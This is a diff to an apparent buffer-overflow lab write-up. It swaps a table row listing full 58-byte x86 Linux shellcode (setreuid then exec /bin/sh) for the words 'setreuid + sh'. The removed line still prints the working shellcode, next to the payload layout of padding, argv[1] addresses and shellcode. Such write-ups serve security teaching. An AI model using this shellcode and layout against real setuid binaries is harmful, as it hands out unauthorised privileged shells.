@@ -746,13 +746,13 @@ AAAAAAAAAAAAAAAAAAAA + addr(argv[1]) + BBBB + 'addr(argv[1]) + 32' + shellcode(s
 
 And their lengths are listed below
 
-| Description        | Content      | Bytes         |
-|:------------------:|:------------:|:-------------:|
-| Padding 1          | 'A' * 20     | 20            |
-| addr(argv[1])      | `0x--------` | 4             |
-| Padding 2          | 'B' * 4      | 4             |
-| addr(argv[1]) + 32 | `0x--------` | 4             |
-| Shellcode          | `\x6a\x31\x58\xcd\x80\x89\xc3\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80` | 58 |
+| Description        | Content         | Bytes         |
+|:------------------:|:---------------:|:-------------:|
+| Padding 1          | 'A' * 20        | 20            |
+| addr(argv[1])      | `0x--------`    | 4             |
+| Padding 2          | 'B' * 4         | 4             |
+| addr(argv[1]) + 32 | `0x--------`    | 4             |
+| Shellcode          | `setreuid + sh` | 58            |
 
 We can calculate the start address of `argv[1]` by
 
